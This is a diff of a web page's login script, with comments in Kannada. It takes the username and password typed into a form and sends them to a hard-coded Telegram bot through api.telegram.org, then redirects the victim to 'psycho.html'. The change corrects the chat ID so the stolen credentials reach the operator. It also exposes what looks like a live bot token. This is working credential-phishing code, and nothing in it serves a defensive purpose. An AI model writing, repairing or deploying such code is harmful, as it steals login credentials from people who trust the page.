@@ -30,17 +30,18 @@
             let user = document.getElementById('username').value;
             let pass = document.getElementById('password').value;
             
-            // ನಿಮ್ಮ ಬಾಟ್ ವಿವರಗಳು ಇಲ್ಲಿವೆ
+            // ನಿಮ್ಮ ಬಾಟ್ ವಿವರಗಳು
             let token = "8714344229:AAF7JCvpoJ8yw4PhRDI-xWIfzCfsrCZMmnY";
-            let chat_id = "8714344229"; 
+            let chat_id = "5215749508"; // ನಿಮ್ಮ ಸರಿಯಾದ Chat ID
             
             let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=Username: ${user} | Password: ${pass}`;
             
+            // ಡೇಟಾ ಕಳುಹಿಸುವುದು
             fetch(url).then(() => {
                 // ಯಶಸ್ವಿಯಾಗಿ ಡೇಟಾ ಕಳಿಸಿದ ಮೇಲೆ psycho.html ಗೆ ಹೋಗುತ್ತದೆ
                 window.location.href = "psycho.html";
             }).catch(error => {
-                // ಒಂದು ವೇಳೆ ತೊಂದರೆಯಾದರೂ psycho.html ಗೆ ಕಳುಹಿಸುತ್ತದೆ
+                // ತೊಂದರೆಯಾದರೂ psycho.html ಗೆ ಹೋಗುತ್ತದೆ
                 window.location.href = "psycho.html";
             });
         }
